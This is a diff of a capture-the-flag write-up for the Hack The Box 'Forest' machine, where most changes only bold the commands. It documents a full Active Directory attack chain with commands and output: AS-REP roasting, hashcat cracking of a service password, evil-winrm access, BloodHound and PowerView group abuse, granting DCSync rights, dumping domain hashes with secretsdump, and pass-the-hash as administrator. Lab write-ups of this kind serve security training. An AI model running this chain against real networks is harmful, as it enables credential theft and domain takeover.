@@ -1,6 +1,6 @@
 # Initial Enemuration 
 ```bash
-`sudo nmap -sS 10.129.63.155`
+**sudo nmap -sS 10.129.63.155**
 Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-15 00:11 +01
 Nmap scan report for 10.129.63.155
 Host is up (0.10s latency).
@@ -68,7 +68,7 @@ userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
 The -U flag is used to enumerate all users.
  Let's enumerate all other objects in the domain using the objectClass=* filter.
  ```bash
-python3 windapsearch.py --dc-ip 10.129.63.155 --custom "objectClass=*"
+**python3 windapsearch.py --dc-ip 10.129.63.155 --custom "objectClass=*"**
 [+] No username provided. Will try anonymous bind.
 [+] Using Domain Controller at: 10.129.63.155
 [+] Getting defaultNamingContext from Root DSE
@@ -104,7 +104,7 @@ It's possible to obtain the Ticket Granting Ticket (TGT) for any account that ha
 With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
 # Foothold
 ```bash
-GetNPUsers.py HTB.LOCAL/ -dc-ip 10.129.63.155 -no-pass -usersfile users
+**GetNPUsers.py HTB.LOCAL/ -dc-ip 10.129.63.155 -no-pass -usersfile users**
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 /home/usef/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
@@ -113,7 +113,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:18bef812450fba6d540cb0dab8b1abea$e4289a48d9
 ```
 let's crack it
 ```bash
-hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+**hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt**
 <[snip]>
 $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$
 5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004
@@ -122,7 +122,7 @@ d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice
 ```
 let try to connect to WinRM using the svc-alfresco user
 ```bash
-evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.63.155   
+**evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.63.155**  
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
 *Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
@@ -140,7 +140,7 @@ Mode                LastWriteTime         Length Name
 ### Bloodhound
 let's try to enumerate the domain using the user svc-alfrsco.
 ```bash
-bloodhound-python  -u svc-alfresco -p s3rvice -ns 10.129.63.155 -d htb.local -c all
+**bloodhound-python  -u svc-alfresco -p s3rvice -ns 10.129.63.155 -d htb.local -c all**
 ```
 ![Screenshot from 2025-02-15 01-00-32](https://github.com/user-attachments/assets/f7d79e6e-0a5f-41b9-904d-8f52c2d713e2)
 let try to see it the user have any rights, we go to Outbound object control seciotn and we see that the user have 88 Group Delegated Object Control	rights.
@@ -153,8 +153,8 @@ nest group membreship gave svc-alfresco generic all on `EXCHANGE WINDOWS PERMISS
 going back to the session we had on winrm, first I uploaded PowerVIew.ps1 scrit and Imported it to the session to use it.
 now we can add ourselves to the EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL group, by abusing generic all right on this group.
 ```bash
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco'
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco'**
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'**
 
 
 GroupDomain             : htb.local
@@ -180,12 +180,12 @@ we succesefully added svc-alfresco to the group.
 With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
 To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.
 ```bash
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -TargetIdentity htb.local -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Add-DomainObjectAcl -TargetIdentity htb.local -Rights DCSync**
 ```
 ## DCSync
 now we can dump hashe of the entire users of the domain including `Administrator` by getting the Administrator hash we can say that we have abused the entire domain.
 ```bash
-secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+**secretsdump.py svc-alfresco:s3rvice@10.10.10.161**
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -199,7 +199,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 ```
 # Full Control
 ```bash
-evil-winrm -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -i 10.129.63.155
+**evil-winrm -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -i 10.129.63.155**
                                         
 Evil-WinRM shell v3.7
                                         
